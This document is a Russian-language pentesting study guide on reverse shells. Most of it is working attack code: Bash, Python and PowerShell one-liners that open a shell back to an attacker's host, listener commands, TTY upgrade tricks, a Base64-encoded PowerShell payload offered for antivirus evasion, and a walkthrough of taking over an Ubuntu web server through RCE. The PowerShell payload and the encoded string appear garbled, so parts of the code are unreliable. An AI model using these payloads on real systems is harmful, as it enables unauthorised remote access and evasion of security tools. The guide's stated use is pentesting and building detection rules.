# Реализации reverse shell на Bash, Python и PowerShell

## Контекст и базовые понятия

Reverse shell (обратный шелл) — это техника удаленного доступа, при которой целевая система инициирует исходящее сетевое соединение к машине атакующего, передавая интерактивную командную оболочку через этот канал. В отличие от bind shell, где порт открывается на цели и ждет входящего подключения, reverse shell обходит ограничения периметровых межсетевых экранов (Firewall) и систем контроля доступа к сети (NAC), так как исходящий трафик в корпоративных сетях обычно разрешен по умолчанию.

Техника является фундаментальным элементом этапа «Initial Access» и «Execution» в модели MITRE ATT&CK (техники T1059, T1053). В контексте тестирования на проникновение (pentesting) и Red Teaming использование reverse shell позволяет исследователю получить интерактивный доступ к системе для дальнейшей разведки, повышения привилегий и латерального перемещения.

Ключевое разграничение необходимо проводить между типами шеллов и механизмами их работы.

| Характеристика | Reverse Shell | Bind Shell | Web Shell |
|---|---|---|---|
| **Направление соединения** | Target → Attacker | Attacker → Target | HTTP/HTTPS (входящий) |
| **Требования к сети** | Исходящий трафик разрешен | Входящий порт открыт | Веб-сервер доступен |
| **Обход фаервола** | Высокий (обычно разрешен outbound) | Низкий (требует проброса портов) | Средний (зависит от WAF) |
| **Типичные реализации** | Bash, Python, PowerShell, Netcat | Netcat, custom binaries | PHP, ASP, JSP скрипты |
| **Сложность обнаружения** | Средняя (зависит от EDR/AV) | Низкая (открытый порт) | Высокая (анализ файлов) |

Reverse shell не является самостоятельным вредоносным ПО в классическом понимании (как вирус или троян), а представляет собой технику выполнения кода. Она может быть реализована через встроенные возможности ОС (Bash, PowerShell), через интерпретаторы языков (Python, Perl) или через специализированные утилиты (Netcat, Socat).

Важно различать **stageless** (безэтапные) и **staged** (этапные) шеллы. Stageless шеллы содержат весь необходимый код для установления соединения и работы внутри одного payload. Staged шеллы (например, Meterpreter) сначала загружают небольшой загрузчик, который затем скачивает основной функционал из C2-сервера. В рамках данного конспекта рассматриваются stageless реализации на базе стандартных языков, так как они наиболее часто встречаются в условиях ограниченного доступа (например, при эксплуатации RCE-уязвимостей, где размер payload ограничен).

## Внутреннее устройство предмета

Для понимания механизмов работы reverse shell необходимо рассмотреть внутреннее устройство трех основных реализаций: Bash, Python и PowerShell. Каждая из них использует разные системные вызовы и механизмы управления потоками ввода-вывода (I/O redirection).

### Bash Reverse Shell: Управление файловыми дескрипторами

Bash reverse shell опирается на встроенную в Bash возможность работы с устройствами ввода-вывода через псевдофайлы `/dev/tcp/` и `/dev/udp/`. Этот механизм не требует внешних утилит (таких как netcat) и работает на уровне ядра Linux/Unix.

Основной принцип работы bash-шелла — перенаправление стандартных потоков (stdin, stdout, stderr) с файловыми дескрипторами 0, 1 и 2 на сокетное соединение.

**Ключевые элементы реализации:**
1.  **Создание сокета:** Использование `/dev/tcp/IP/PORT` открывает TCP-соединение.
2.  **Перенаправление ввода (`0>&1`):** Стандартный ввод (stdin) перенаправляется на выход сокета. Это позволяет получать команды с атакующей машины.
3.  **Перенаправление вывода (`>&`):** Стандартный вывод (stdout) и вывод ошибок (stderr) перенаправляются на сокет. Это позволяет видеть результат выполнения команд.
4.  **Интерактивный режим (`-i`):** Флаг `-i` заставляет bash запускаться в интерактивном режиме, что критически важно для работы функций, зависящих от терминала (например, `ls`, `cd`, `vi`). Без него шелл может выглядеть «мертвым» или некорректно обрабатывать ввод.

**Типичные варианты синтаксиса:**
*   `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` — классический однострочник.
*   `/bin/bash -l > /dev/tcp/ATTACKER_IP/PORT 0< & 1 2>&1` — вариант с загрузкой профиля.
*   `exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done` — более сложный вариант с явным дескриптором.

### Python Reverse Shell: Модули socket и subprocess

Python реализация использует стандартную библиотеку языка для создания сетевого соединения и управления процессами. Она кроссплатформенна (работает на Linux, Windows, macOS) при наличии установленного интерпретатора.

**Внутренняя структура payload:**
1.  **Импорт модулей:** `socket` (сеть), `subprocess` (запуск процессов), `os` (системные вызовы).
2.  **Создание сокета:** `socket.socket(socket.AF_INET, socket.SOCK_STREAM)` создает IPv4 TCP-сокет.
3.  **Подключение:** `s.connect((IP, PORT))` инициирует исходящее соединение.
4.  **Дублирование дескрипторов:** `os.dup2(s.fileno(), fd)` копирует файловый дескриптор сокета в дескрипторы 0, 1 и 2. Это заменяет стандартные потоки ввода-вывода процесса python на сетевой сокет.
5.  **Запуск шелла:** `subprocess.call(["/bin/sh", "-i"])` или `pty.spawn("/bin/bash")` запускает новую оболочку, которая наследует перенаправленные потоки.

**Особенности:**
*   Использование `pty.spawn` (модуль `pty`) позволяет получить полноценный TTY (терминал), что необходимо для работы программ, требующих интерактивного терминала (например, `sudo`, `vim`, `ssh`).
*   В Windows путь к шеллу меняется на `["cmd.exe"]` или `["powershell.exe"]`.

### PowerShell Reverse Shell: .NET Framework и COM-объекты

PowerShell является мощным инструментом администрирования Windows, но в контексте атак он часто используется из-за своей встроенной доступности и возможностей работы с .NET.

**Внутренняя структура:**
1.  **Загрузка .NET классов:** Использование `New-Object System.Net.Sockets.TCPClient` для создания сокета.
2.  **Получение потока:** `GetStream()` возвращает объект потока данных (NetworkStream).
3.  **Буферизация:** Создание буфера байтов (`New-Object System.Byte[]`) для чтения данных.
4.  **Цикл выполнения:** Бесконечный цикл, который:
    *   Читает данные из сокета (команды).
    *   Декодирует байты в строку.
    *   Выполняет строку через `Invoke-Expression` (или `iex`).
    *   Кодирует результат выполнения обратно в байты.
    *   Записывает результат в сокет.
5.  **Перехват ошибок:** Часто используется `2>&1` для захвата ошибок и отправки их атакующему.

**Варианты реализации:**
*   **Стандартный TCP:** Явное создание сокета через .NET.
*   **Base64-encoded:** Код PowerShell кодируется в Base64 для обхода политик выполнения (Execution Policy) и антивирусов, затем выполняется через `powershell -enc <base64>`.
*   **IEX (Invoke-Expression):** Использование `IEX` для выполнения динамического кода.

### Сравнительный анализ механизмов

| Параметр | Bash | Python | PowerShell |
|---|---|---|---|
| **Базовая технология** | Shell redirection (`/dev/tcp`) | Standard Library (`socket`, `subprocess`) | .NET Framework (`System.Net.Sockets`) |
| **Платформа** | Linux/Unix | Cross-platform | Windows (и Linux/macOS через PowerShell Core) |
| **Зависимости** | Нет (встроен в bash) | Интерпретатор Python | Интерпретатор PowerShell |
| **TTY Support** | Требует `bash -i` | Требует `pty.spawn` | Встроен в консоль, но требует настройки |
| **Обход EDR/AV** | Низкий (часто детектируется по `/dev/tcp`) | Средний (детектируется по импортам socket/subprocess) | Высокий (при использовании obfuscation) |
| **Сложность обфускации** | Низкая | Средняя | Высокая (множество способов кодирования) |

## Применение и работа с предметом

На практике выбор реализации reverse shell зависит от доступных инструментов на целевой системе, ограничений на размер payload (например, при эксплуатации SQLi или RCE) и требований к стабильности соединения.

### Настройка слушателя (Listener)

Перед запуском шелла на цели необходимо настроить слушатель на машине атакующего.

```bash
# Использование Netcat (Ncat)
ncat -lvnp 4444

# Использование Socat (поддержка TTY)
socat file:`tty`,raw,echo=0 TCP-L:4444
```

`ncat -lvnp` запускает слушатель на порту 4444. Флаг `-l` означает listen, `-v` verbose, `-n` no DNS lookup, `-p` port. `socat` предпочтительнее, так как он автоматически управляет терминалом, что решает проблему «висящего» шелла без возможности ввода команд.

### Реализация Bash Reverse Shell

**Сценарий:** Целевая система Linux, есть возможность выполнить произвольную команду (RCE).

**Payload:**
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Анализ:**
*   `bash -i`: Запуск интерактивного bash.
*   `>& /dev/tcp/10.0.0.1/4444`: Перенаправление stdout и stderr на сокет.
*   `0>&1`: Перенаправление stdin на stdout (который теперь является сокетом).

**Проблемы и решения:**
*   Если шелл не интерактивный, команды не выполняются. Решение: добавить `bash -i`.
*   Если шелл «зависает» после первой команды, возможно, не перенаправлен stderr. Решение: убедиться, что `2>&1` включен (в `>&` это подразумевается).
*   Если `/dev/tcp` не поддерживается (некоторые минимальные сборки bash), использовать `nc` или `python`.

### Реализация Python Reverse Shell

**Сценарий:** Целевая система Linux или Windows, установлен Python, но нет bash или PowerShell.

**Payload (Linux):**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Анализ:**
*   `socket.socket(...)`: Создание сокета.
*   `s.connect(...)`: Подключение.
*   `os.dup2(...)`: Замена дескрипторов 0, 1, 2 на дескриптор сокета.
*   `subprocess.call(["/bin/sh","-i"])`: Запуск шелла.

**Payload (Windows):**
```python
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"
```

**Особенности:**
*   В Windows путь к шеллу `cmd.exe`.
*   Если Python 2, то `subprocess` может не работать так же, как в Python 3. В Python 2 часто используют `os.system` или `pty`.
*   Для получения TTY в Python используется `pty.spawn('/bin/bash')` вместо `subprocess.call`.

### Реализация PowerShell Reverse Shell

**Сценарий:** Целевая система Windows, есть PowerShell.

**Payload (Стандартный):**
```powershell
$c=New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$s=$c.GetStream();[byte[]]$b=0..255|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b);$a="";while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d+=([System.Text.ASCIIEncoding]::GetString($b));if($d.EndsWith("`n")){break};$d=""};$x=invoke-expression $d 2>&1 | Out-String;$x2=$x+$("PS " + (pwd).Path + "> ");$sendbyte=([text.encoding]::ASCII).GetBytes($x2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$c.Close()
```

**Анализ:**
*   `New-Object System.Net.Sockets.TCPClient`: Создание сокета.
*   `$s.Read(...)`: Чтение данных из потока.
*   `invoke-expression $d`: Выполнение полученной команды.
*   `Out-String`: Преобразование вывода в строку.
*   `GetBytes(...)`: Кодирование вывода обратно в байты для отправки.

**Обфускация для обхода AV:**
```powershell
powershell -enc JABjAGwAaQBlAG4AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAH0AIAAtAFAAYQB5AGMAYQBjAG4AIAAtAFsAbwB2AG8AcwBzAA==
```
Кодированный payload выполняется через `powershell -enc`, что позволяет обойти базовые проверки командной строки.

### Типичные ошибки и подводные камни

1.  **Отсутствие TTY:** Многие программы (например, `sudo`, `vim`, `ssh`) требуют наличия терминала (TTY). Без него они могут не работать или запрашивать пароль, который не может быть введен. Решение: использовать `script /dev/null -c bash` или `python -c 'import pty; pty.spawn("/bin/bash")'`.
2.  **Символы экранирования:** В веб-уязвимостях (XSS, RCE) специальные символы (`&`, `;`, `$`, `"`) могут быть экранированы. Решение: использовать URL-кодирование или обходные техники.
3.  **Блокировка сокетов:** Антивирусы и EDR могут блокировать создание сетевых соединений из процессов, не являющихся браузерами или клиентами обновлений. Решение: использовать легитимные процессы (например, `curl`, `wget`, `certutil`) для загрузки шелла.
4.  **Ограничение размера payload:** В некоторых уязвимостях (например, SQLi) размер вводимых данных ограничен. Решение: использовать короткие однострочники или загрузку шелла через `wget`/`curl`.

## Сквозной практический пример: Получение интерактивного шелла на Linux-сервере

**Исходные условия:**
*   **Атакующая машина:** Kali Linux (IP: `192.168.1.100`).
*   **Целевая машина:** Ubuntu 22.04 Server (IP: `192.168.1.101`), уязвимость RCE в веб-приложении.
*   **Инструменты:** Netcat, Bash, Python3.
*   **Роль:** Pentester, имеющий возможность выполнить произвольную команду на сервере.

**Шаг 1: Настройка слушателя на атакующей машине**

Атакующий запускает слушатель на порту 4444.

```bash
# На Kali Linux
ncat -lvnp 4444
```

**Ожидаемый вывод:**
```
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

**Шаг 2: Эксплуатация уязвимости и запуск Bash Reverse Shell**

Атакующий находит уязвимость RCE в веб-приложении на цели. В поле ввода вставляется payload.

```bash
# Payload, введенный в уязвимое поле
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

**Ожидаемый результат на слушателе:**
```
Ncat: Connection from 192.168.1.101:54321.
Ncat: Connection from 192.168.1.101:54321.
```

**Шаг 3: Получение интерактивного TTY**

Полученный шелл может быть не интерактивным (нет подсветки синтаксиса, не работают `sudo`, `vim`). Для улучшения взаимодействия атакующий запускает скрипт на получение TTY.

```bash
# В полученном шелле на цели
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Ожидаемый результат:**
Интерфейс становится полноценным терминалом. Атакующий может выполнять команды, как если бы он сидел за консолью цели.

```bash
www-data@ubuntu:/var/www/html$ whoami
www-data
www-data@ubuntu:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Шаг 4: Повышение привилегий (демонстрация работы шелла)**

Атакующий пытается использовать `sudo`.

```bash
www-data@ubuntu:/var/www/html$ sudo -l
[sudo] password for www-data: 
```

Если пароль неизвестен, шелл позволяет попытаться подобрать его или найти другие векторы повышения привилегий.

**Ожидаемый вывод:**
Шелл функционирует стабильно, команды выполняются, вывод возвращается атакующему.

**Вывод по примеру:**
Данный пример демонстрирует полный цикл получения reverse shell: от настройки слушателя до получения интерактивного доступа. Использование `bash -i` и `pty.spawn` критически важно для удобства работы и функциональности.

## Аналитический вывод

Reverse shell остается одним из наиболее эффективных методов получения начального доступа к целевой системе в условиях тестирования на проникновение. Выбор между Bash, Python и PowerShell зависит от целевой ОС и доступных инструментов. Bash-шеллы легковесны и не требуют внешних зависимостей, но работают только на Unix-системах. Python-шеллы кроссплатформенны и гибки, но требуют установленного интерпретатора. PowerShell-шеллы мощны в среде Windows, но часто детектируются антивирусами из-за своих размеров и использования .NET.

Ключевой проблемой при использовании reverse shell является обход современных средств защиты (EDR, AV, WAF). Простые однострочники часто попадают в базы сигнатур. Поэтому на практике применяются техники обфускации, кодирования (Base64, Unicode) и использования легитимных процессов (Living off the Land). Кроме того, стабильность шелла зависит от наличия TTY, что требует дополнительных шагов по его инициализации.

Для специалистов по информационной безопасности понимание механизмов работы reverse shell необходимо не только для проведения атак, но и для разработки правил детекции (SIEM, IDS/IPS) и настройки политик безопасности. Мониторинг исходящих соединений на нестандартные порты, анализ поведения процессов (например, запуск `bash` из веб-сервера) и блокировка выполнения подозрительных скриптов являются эффективными мерами противодействия.
